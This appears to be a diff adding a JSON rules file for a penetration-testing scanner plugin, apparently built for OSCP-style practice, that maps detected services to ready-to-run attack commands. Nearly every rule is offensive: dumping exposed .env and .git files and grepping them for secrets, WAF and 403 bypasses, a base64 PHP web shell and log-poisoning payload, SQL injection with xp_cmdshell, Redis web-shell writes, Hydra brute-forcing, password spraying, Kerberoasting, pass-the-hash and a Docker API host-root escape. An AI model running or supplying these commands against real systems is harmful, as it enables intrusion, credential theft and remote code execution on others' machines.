@@ -1,0 +1,484 @@
+{
+  "version": "1.3.37",
+  "description": "ncscanner web-scanner plugin rules \u2014 edit to add custom checks",
+  "format": "Each rule fires when its trigger tags match the detected technology. Commands support {url}, {host}, {port}, {exts_csv}, {wl_*} placeholders.",
+  "rules": [
+    {
+      "name": "Web - Core recon (always run)",
+      "tags_any": [
+        "web"
+      ],
+      "commands": [
+        "# === CORE WEB RECON ===",
+        "curl -sIkL '{url}' | grep -iE 'server|x-powered|location|set-cookie|content-type|x-aspnet'",
+        "curl -sk '{url}.well-known/security.txt' | head -n 30",
+        "curl -sk '{url}crossdomain.xml' 2>/dev/null | head -n 20",
+        "curl -sk '{url}clientaccesspolicy.xml' 2>/dev/null | head -n 20"
+      ]
+    },
+    {
+      "name": "Web - Sensitive files quick hunt",
+      "tags_any": [
+        "web"
+      ],
+      "commands": [
+        "# === SENSITIVE FILES ===",
+        "curl -sk '{url}.env' | head -30",
+        "curl -sk '{url}.env.local' | head -20",
+        "curl -sk '{url}.env.backup' | head -20",
+        "curl -sk '{url}config.php' | head -20",
+        "curl -sk '{url}config.php.bak' | head -20",
+        "curl -sk '{url}database.yml' | head -20",
+        "curl -sk '{url}settings.py' | head -20",
+        "curl -sk '{url}.htpasswd' | head -20",
+        "curl -sk '{url}configuration.php' | head -20",
+        "curl -sk '{url}application.properties' | head -20",
+        "curl -sk '{url}application.yml' | head -20"
+      ]
+    },
+    {
+      "name": "Web - Git exposure",
+      "tags_any": [
+        "web"
+      ],
+      "commands": [
+        "# === GIT / VCS EXPOSURE ===",
+        "curl -sk '{url}.git/HEAD'  # If 'ref: refs/' \u2192 git is exposed!",
+        "curl -sk '{url}.git/config' | head -20",
+        "git-dumper '{url}.git' /tmp/git-dump 2>/dev/null",
+        "cd /tmp/git-dump && git log --all --oneline 2>/dev/null | head -30",
+        "cd /tmp/git-dump && grep -riE 'password|secret|api_key|token|credential' . 2>/dev/null | head -30",
+        "curl -sk '{url}.svn/entries' | head -10",
+        "curl -sk '{url}.hg/store/00manifest.i' -I"
+      ]
+    },
+    {
+      "name": "Web - Directory bruteforce (5 targeted commands)",
+      "tags_any": [
+        "web"
+      ],
+      "commands": [
+        "# === DIRECTORY BRUTE-FORCE (5 best \u2014 escalate as needed) ===",
+        "# [1] Quick raft-medium, non-recursive first look (~20-60s)",
+        "feroxbuster -u '{url}' -x {exts_csv} --no-recursion -C 404,400 -t 40 -q -w {wl_medium} -o /tmp/ferox_{port}_quick.txt",
+        "# [2] Medium raft-medium with recursive link extraction (~5-10min)",
+        "feroxbuster -u '{url}' -x {exts_csv} --extract-links --depth 3 -C 404,400 -t 50 -q -w {wl_medium} -o /tmp/ferox_{port}_medium.txt",
+        "# [3] Deep raft-large with auto-calibration (~20-45min, only if [1]+[2] insufficient)",
+        "ffuf -u '{url}FUZZ' -w {wl_large} -e '.{exts_csv}' -mc 200,201,204,301,302,307,401,403 -t 40 -ac -of csv -o /tmp/ffuf_{port}_deep.csv 2>/dev/null",
+        "# [4] Parameter discovery",
+        "ffuf -u '{url}?FUZZ=1' -w {wl_params} -mc 200 -t 30 -of csv 2>/dev/null | head -20",
+        "# [5] Vhost / subdomain discovery",
+        "ffuf -u '{url}' -H 'Host: FUZZ.{host}' -w {wl_dns} -mc 200,301,302,401,403 -t 40 -of csv 2>/dev/null | head -20"
+      ]
+    },
+    {
+      "name": "Web - WAF detected \u2014 throttle & bypass",
+      "tags_any": [
+        "waf"
+      ],
+      "commands": [
+        "# === WAF BYPASS ===",
+        "feroxbuster -u '{url}' -x {exts_csv} -t 5 --rate-limit 10 --random-agent -C 403,429 -q -w {wl_common}",
+        "feroxbuster -u '{url}' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -x {exts_csv} -t 5 --rate-limit 10 -C 404,429 -q -w {wl_common}",
+        "for p in admin manager login console backup config; do curl -sk '{url}'$p/ -H 'X-Forwarded-For: 127.0.0.1' -o /dev/null -w \"%{http_code}  $p/\\n\"; done"
+      ]
+    },
+    {
+      "name": "Web - LFI testing",
+      "tags_any": [
+        "web",
+        "php",
+        "lfi"
+      ],
+      "commands": [
+        "# === LOCAL FILE INCLUSION ===",
+        "wfuzz -c -z file,{wl_lfi} --hc 404 '{url}?file=FUZZ' 2>/dev/null | head -30",
+        "wfuzz -c -z file,{wl_lfi} --hc 404 '{url}?page=FUZZ' 2>/dev/null | head -30",
+        "# PHP wrappers: php://filter/convert.base64-encode/resource=index.php",
+        "# PHP wrappers: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+        "# Log poisoning: curl -sk '{url}' -H 'User-Agent: <?php system($_GET[cmd]); ?>' then: ?file=/var/log/apache2/access.log&cmd=id"
+      ]
+    },
+    {
+      "name": "Web - SQL injection (MANUAL ONLY)",
+      "tags_any": [
+        "web"
+      ],
+      "commands": [
+        "# === SQL INJECTION (MANUAL \u2014 sqlmap/sqlninja are OSCP-banned) ===",
+        "# Error-based: ' OR '1'='1 (watch for SQL syntax errors)",
+        "# UNION column count: ' ORDER BY 1-- (increment until error)",
+        "# UNION extraction: ' UNION SELECT NULL,NULL,NULL-- (match column count)",
+        "# MySQL time-based: ' OR SLEEP(5)--",
+        "# MSSQL: '; WAITFOR DELAY '0:0:5'-- | '; EXEC xp_cmdshell('whoami')--",
+        "# PostgreSQL: '; SELECT pg_sleep(5)--",
+        "# Boolean blind: ' AND 1=1-- vs ' AND 1=2-- (compare response)"
+      ]
+    },
+    {
+      "name": "Web - SSTI testing",
+      "tags_any": [
+        "web",
+        "ssti",
+        "flask",
+        "jinja"
+      ],
+      "commands": [
+        "# === SERVER-SIDE TEMPLATE INJECTION ===",
+        "# Test: {{7*7}} ${7*7} #{7*7} <%= 7*7 %> (look for 49)",
+        "# Jinja2 RCE: {{''.__class__.__mro__[1].__subclasses__()}}"
+      ]
+    },
+    {
+      "name": "Web - 403 Bypass Techniques",
+      "tags_any": [
+        "web"
+      ],
+      "match_any": [
+        "403",
+        "forbidden"
+      ],
+      "commands": [
+        "# === 403 BYPASS ===",
+        "curl -sS '{url}BLOCKED_PATH' -H 'X-Original-URL: /BLOCKED_PATH'",
+        "curl -sS '{url}BLOCKED_PATH' -H 'X-Rewrite-URL: /BLOCKED_PATH'",
+        "curl -sS '{url}BLOCKED_PATH' -H 'X-Forwarded-For: 127.0.0.1'",
+        "curl -sS '{url}BLOCKED_PATH/'",
+        "curl -sS '{url}//BLOCKED_PATH'",
+        "curl -sS '{url}BLOCKED_PATH..;/'",
+        "curl -sS -X POST '{url}BLOCKED_PATH'",
+        "bypass-403 '{url}BLOCKED_PATH'"
+      ]
+    },
+    {
+      "name": "Generic web enumeration (fallback)",
+      "tags_any": [
+        "web"
+      ],
+      "not_any": [
+        "wordpress",
+        "drupal",
+        "joomla",
+        "jenkins",
+        "iis",
+        "aspnet",
+        "sharepoint"
+      ],
+      "commands": [
+        "# Generic web enumeration",
+        "feroxbuster -u '{url}' -x txt,html,php,bak,old --extract-links -C 404 -t 50 -w {wl_medium}"
+      ]
+    },
+    {
+      "name": "Spring Boot Actuator endpoints",
+      "tags_any": [
+        "spring_actuator"
+      ],
+      "commands": [
+        "# Spring Boot Actuator \u2014 check for sensitive exposure",
+        "curl -sS '{url}actuator' | jq .",
+        "curl -sS '{url}actuator/env' | jq .  # credentials!",
+        "curl -sS '{url}actuator/heapdump' -o heapdump.hprof  # JVM heap dump",
+        "strings heapdump.hprof | grep -iE '(password|secret|token|key|jdbc)' | head -50",
+        "curl -sS '{url}jolokia/read/java.lang:type=Memory'"
+      ]
+    },
+    {
+      "name": "GraphQL API",
+      "tags_any": [
+        "graphql"
+      ],
+      "commands": [
+        "# GraphQL \u2014 manual testing only (graphql-cop is OSCP-banned)",
+        "curl -sS '{url}graphql' -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name type{name}}}}}\"}' | jq .",
+        "curl -sS '{url}graphql' -X POST -H 'Content-Type: application/json' -d '{\"query\":\"query{__typename}\"}'",
+        "curl -sS '{url}graphql' -X POST -H 'Content-Type: application/json' -d '[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]'"
+      ]
+    },
+    {
+      "name": "Flask / Werkzeug debug mode",
+      "tags_any": [
+        "flask_debug"
+      ],
+      "commands": [
+        "# Flask Werkzeug debugger \u2014 potential RCE!",
+        "curl -sS '{url}console'",
+        "# PIN calc requires LFI: /proc/sys/kernel/random/boot_id + /sys/class/net/ens*/address"
+      ]
+    },
+    {
+      "name": "Laravel application",
+      "tags_any": [
+        "laravel"
+      ],
+      "commands": [
+        "curl -sS '{url}.env' | head -50  # credentials!",
+        "curl -sS '{url}storage/logs/laravel.log' | tail -100",
+        "curl -sS '{url}%00' -v 2>&1 | grep -iE 'laravel|exception|trace'",
+        "feroxbuster -u '{url}' -x php --extract-links -C 404 -t 30 -w {wl_common}",
+        "feroxbuster -u '{url}api/' -x json,php -t 30 -w {wl_api}"
+      ]
+    },
+    {
+      "name": "SSH - Enumeration and brute-force",
+      "tags_any": [
+        "ssh"
+      ],
+      "commands": [
+        "# === SSH ===",
+        "ssh-audit {ip}:{port} 2>/dev/null | head -40",
+        "nmap -p {port} --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods {ip} 2>/dev/null",
+        "hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ssh://{ip}:{port} -t 4 -f 2>/dev/null"
+      ]
+    },
+    {
+      "name": "FTP - Anonymous access",
+      "tags_any": [
+        "ftp"
+      ],
+      "commands": [
+        "# === FTP ===",
+        "ftp -n {ip} {port} <<< $'user anonymous anonymous\\nls -la\\nbye'",
+        "nmap -p {port} --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor {ip} 2>/dev/null",
+        "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ftp://{ip}:{port} -t 4 -f 2>/dev/null"
+      ]
+    },
+    {
+      "name": "SMTP - User enumeration",
+      "tags_any": [
+        "smtp"
+      ],
+      "commands": [
+        "# === SMTP ===",
+        "nmap -p {port} --script smtp-commands,smtp-ntlm-info,smtp-open-relay,smtp-enum-users {ip} 2>/dev/null",
+        "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {ip} -p {port} 2>/dev/null | head -20",
+        "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {ip} -p {port} 2>/dev/null | head -20"
+      ]
+    },
+    {
+      "name": "DNS - Zone transfer",
+      "tags_any": [
+        "dns"
+      ],
+      "commands": [
+        "# === DNS ===",
+        "dig ANY @{ip} {host} +noall +answer 2>/dev/null",
+        "dig axfr @{ip} {host} 2>/dev/null",
+        "dnsrecon -d {host} -n {ip} -t std 2>/dev/null | head -30"
+      ]
+    },
+    {
+      "name": "SMB - Null session and enum",
+      "tags_any": [
+        "smb"
+      ],
+      "commands": [
+        "# === SMB ===",
+        "nxc smb {ip} 2>/dev/null",
+        "nxc smb {ip} --shares -u '' -p '' 2>/dev/null",
+        "nxc smb {ip} --shares -u 'guest' -p '' 2>/dev/null",
+        "smbmap -H {ip} -u '' -p '' 2>/dev/null",
+        "smbclient -L //{ip}/ -N 2>/dev/null",
+        "enum4linux-ng -A {ip} 2>/dev/null | head -100"
+      ]
+    },
+    {
+      "name": "LDAP - Anonymous bind",
+      "tags_any": [
+        "ldap"
+      ],
+      "commands": [
+        "# === LDAP ===",
+        "nmap -p {port} --script ldap-rootdse,ldap-search {ip} 2>/dev/null",
+        "ldapsearch -x -H ldap://{ip}:{port} -s base namingcontexts 2>/dev/null",
+        "ldapsearch -x -H ldap://{ip}:{port} -b 'DC=DOMAIN,DC=LOCAL' '(objectClass=user)' sAMAccountName 2>/dev/null | head -50"
+      ]
+    },
+    {
+      "name": "SNMP - Community and walk",
+      "tags_any": [
+        "snmp"
+      ],
+      "commands": [
+        "# === SNMP ===",
+        "onesixtyone -c {wl_snmp} {ip} 2>/dev/null",
+        "snmpwalk -c public -v2c {ip} . 2>/dev/null | head -50",
+        "snmpwalk -c public -v2c {ip} 1.3.6.1.2.1.25.4.2.1.2 2>/dev/null  # processes",
+        "snmpwalk -c public -v2c {ip} 1.3.6.1.4.1.77.1.2.25 2>/dev/null  # users",
+        "snmp-check {ip} -c public 2>/dev/null | head -80"
+      ]
+    },
+    {
+      "name": "NFS - Exports and mount",
+      "tags_any": [
+        "nfs"
+      ],
+      "commands": [
+        "# === NFS ===",
+        "showmount -e {ip} 2>/dev/null",
+        "nmap -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs {ip} 2>/dev/null",
+        "mkdir -p /tmp/nfs && mount -t nfs {ip}:/ /tmp/nfs -o nolock 2>/dev/null && ls -la /tmp/nfs/"
+      ]
+    },
+    {
+      "name": "MySQL - Brute and enum",
+      "tags_any": [
+        "mysql"
+      ],
+      "commands": [
+        "# === MYSQL ===",
+        "nxc mysql {ip} -u root -p '' 2>/dev/null",
+        "nxc mysql {ip} -u root -p root 2>/dev/null",
+        "mysql -h {ip} -u root -p'' -e 'SHOW DATABASES; SELECT user,host,authentication_string FROM mysql.user;' 2>/dev/null",
+        "# UDF Privesc: SHOW VARIABLES LIKE 'plugin_dir'; searchsploit -x 1518",
+        "hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt mysql://{ip} -t 4 -f 2>/dev/null"
+      ]
+    },
+    {
+      "name": "MSSQL - Exploitation chain",
+      "tags_any": [
+        "mssql"
+      ],
+      "commands": [
+        "# === MSSQL ===",
+        "nxc mssql {ip} -u sa -p '' --local-auth 2>/dev/null",
+        "nxc mssql {ip} -u sa -p sa --local-auth 2>/dev/null",
+        "impacket-mssqlclient sa:''@{ip} 2>/dev/null",
+        "# Post-auth: enable_xp_cmdshell \u2192 xp_cmdshell 'whoami'",
+        "# Stacked: '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--",
+        "hydra -l sa -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt mssql://{ip} -t 4 -f 2>/dev/null"
+      ]
+    },
+    {
+      "name": "PostgreSQL - Brute and RCE",
+      "tags_any": [
+        "postgresql"
+      ],
+      "commands": [
+        "# === POSTGRESQL ===",
+        "psql -h {ip} -U postgres -c '\\l' 2>/dev/null",
+        "nxc postgres {ip} -u postgres -p '' 2>/dev/null",
+        "# RCE: COPY (SELECT '') TO PROGRAM 'id';",
+        "hydra -l postgres -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt postgres://{ip} -t 4 -f 2>/dev/null"
+      ]
+    },
+    {
+      "name": "Redis - Unauthenticated access",
+      "tags_any": [
+        "redis"
+      ],
+      "commands": [
+        "# === REDIS ===",
+        "redis-cli -h {ip} INFO 2>/dev/null | head -20",
+        "redis-cli -h {ip} KEYS '*' 2>/dev/null | head -30",
+        "# RCE via SSH: CONFIG SET dir /root/.ssh/ \u2192 SET x 'ssh-rsa ...' \u2192 SAVE",
+        "# RCE via webshell: CONFIG SET dir /var/www/html/ \u2192 SET x '<?php system($_GET[c]); ?>' \u2192 SAVE"
+      ]
+    },
+    {
+      "name": "WinRM - Shell and spraying",
+      "tags_any": [
+        "winrm"
+      ],
+      "commands": [
+        "# === WINRM ===",
+        "nxc winrm {ip} 2>/dev/null",
+        "evil-winrm -i {ip} -u USER -p PASSWORD 2>/dev/null",
+        "evil-winrm -i {ip} -u Administrator -H NTHASH 2>/dev/null  # PTH",
+        "nxc winrm {ip} -u users.txt -p 'Password123!' --continue-on-success 2>/dev/null"
+      ]
+    },
+    {
+      "name": "Kerberos - AS-REP + Kerberoast",
+      "tags_any": [
+        "kerberos"
+      ],
+      "commands": [
+        "# === KERBEROS ===",
+        "impacket-GetNPUsers -dc-ip {ip} -request 'DOMAIN/' -no-pass -outputfile asrep.txt 2>/dev/null",
+        "hashcat -m 18200 asrep.txt {wl_rockyou} --force 2>/dev/null",
+        "impacket-GetUserSPNs 'DOMAIN/USER:PASS' -dc-ip {ip} -request -outputfile spn.txt 2>/dev/null",
+        "hashcat -m 13100 spn.txt {wl_rockyou} --force 2>/dev/null",
+        "kerbrute userenum --dc {ip} -d DOMAIN {wl_dns} 2>/dev/null | grep 'VALID'"
+      ]
+    },
+    {
+      "name": "RPC - Portmapper enumeration",
+      "tags_any": [
+        "rpcbind",
+        "msrpc"
+      ],
+      "commands": [
+        "# === RPC ===",
+        "rpcinfo -p {ip} 2>/dev/null",
+        "rpcclient -U '' -N {ip} -c 'enumdomusers;enumdomgroups;netshareenum;srvinfo' 2>/dev/null"
+      ]
+    },
+    {
+      "name": "RDP - Enumeration",
+      "tags_any": [
+        "rdp"
+      ],
+      "commands": [
+        "# === RDP ===",
+        "nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 {ip} 2>/dev/null",
+        "xfreerdp3 /v:{ip}:{port} /u:USER /p:PASS /dynamic-resolution /clipboard 2>/dev/null",
+        "nxc rdp {ip} -u users.txt -p 'Password123!' --continue-on-success 2>/dev/null"
+      ]
+    },
+    {
+      "name": "Rsync - List and download",
+      "tags_any": [
+        "rsync"
+      ],
+      "commands": [
+        "rsync --list-only rsync://{ip}/ 2>/dev/null",
+        "rsync -av rsync://{ip}/SHARE /tmp/rsync_loot/ 2>/dev/null"
+      ]
+    },
+    {
+      "name": "Docker - Exposed API",
+      "tags_any": [
+        "docker"
+      ],
+      "commands": [
+        "# === DOCKER API (CRITICAL) ===",
+        "curl -sk http://{ip}:2375/version 2>/dev/null | python3 -m json.tool",
+        "curl -sk http://{ip}:2375/containers/json 2>/dev/null | python3 -m json.tool | head -40",
+        "docker -H tcp://{ip}:2375 run -it --rm -v /:/mnt alpine chroot /mnt sh  # ROOT on host"
+      ]
+    },
+    {
+      "name": "IPMI - Cipher zero",
+      "tags_any": [
+        "ipmi"
+      ],
+      "commands": [
+        "# === IPMI ===",
+        "nmap -p 623 -sU --script ipmi-cipher-zero,ipmi-version {ip} 2>/dev/null",
+        "ipmitool -I lanplus -C 0 -H {ip} -U root -P root user list 2>/dev/null  # cipher 0 bypass",
+        "hashcat -m 7300 ipmi_hashes.txt {wl_rockyou} --force 2>/dev/null"
+      ]
+    },
+    {
+      "name": "distcc - RCE",
+      "tags_any": [
+        "distcc"
+      ],
+      "commands": [
+        "nmap -p 3632 --script distcc-cve2004-2687 --script-args=\"distcc-cve2004-2687.cmd='id'\" {ip} 2>/dev/null"
+      ]
+    },
+    {
+      "name": "Finger - User enum",
+      "tags_any": [
+        "finger"
+      ],
+      "commands": [
+        "finger @{ip} 2>/dev/null",
+        "finger root@{ip} 2>/dev/null",
+        "for user in $(cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt); do echo \"$user: $(finger $user@{ip} 2>/dev/null)\"; done | head -30"
+      ]
+    }
+  ]
+}
